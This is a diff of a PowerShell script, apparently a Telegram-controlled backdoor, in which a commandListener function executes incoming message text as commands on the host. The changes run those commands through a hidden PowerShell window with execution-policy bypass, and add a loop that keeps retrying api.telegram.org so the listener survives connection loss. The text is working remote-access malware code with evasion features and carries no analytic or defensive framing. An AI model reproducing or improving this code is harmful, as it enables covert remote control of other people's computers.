@@ -180,7 +180,8 @@ function commandListener
                     elseif ($text.Length -gt 0)                                         # If the length of message is greater 0 then execute it
                     {
                         try {
-                            $output = Invoke-Expression $text | Out-String              # Execute the message and save it as a string
+                            $output = Powershell.exe -ep Bypass -WindowStyle Hidden -Command $text
+                            $output = $output | Out-String
                         } catch {
                             $output = $Error[0] | Out-String                            # If the command returns error save it as a string
                         }
@@ -223,10 +224,17 @@ function commandListener
 
             Start-Sleep -Milliseconds $wait                                             # Sleep timer
         }
-    } catch {
-        while (-Not(tnc).PingSucceeded)                                                 # If the connection lost wait until connected
-        { 
-            Start-Sleep -Milliseconds 5                                                 # Use a sleep timer for relaxing the CPU
+    } 
+    catch {
+        while ($true) {
+            try {
+                Test-NetConnection -ComputerName "api.telegram.org" -Port 80
+                break
+            }
+            catch {
+                Write-Host $Error[0]
+                Start-Sleep -Milliseconds 5
+            }
         }
 
         commandListener                                                                 # Once the connection will be restored reset the listener
